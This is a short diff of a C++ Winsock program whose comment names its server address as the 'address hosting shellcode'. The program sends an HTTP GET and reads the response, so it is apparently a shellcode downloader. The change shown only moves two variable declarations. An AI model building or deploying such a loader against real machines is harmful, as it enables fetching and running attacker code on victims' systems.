@@ -25,8 +25,6 @@ int main()
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
 	char buf[8192];
-	int bytesReceived;
-	string response;
 
 	// address hosting shellcode
 	string server = "127.0.0.1";
@@ -49,6 +47,8 @@ int main()
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
+	int bytesReceived;
+	string response;
 	while ((bytesReceived = recv(sock, buf, 8192, 0)) > 0)
 	{
 		response += buf;
